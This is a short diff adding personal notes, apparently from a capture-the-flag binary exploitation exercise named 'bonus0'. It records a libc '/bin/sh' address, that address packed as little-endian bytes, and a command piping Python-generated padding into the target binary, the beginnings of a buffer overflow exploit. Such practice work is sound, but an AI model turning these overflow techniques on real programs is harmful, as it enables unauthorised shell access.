@@ -1,0 +1,7 @@
+
+
+Adresse /biin/sh : 0xb7f8cc58
+
+\x58\xcc\xf8\xb7
+
+python -c 'print "AAAAAA"'; python -c 'print "AAAAAA"' | ./bonus0
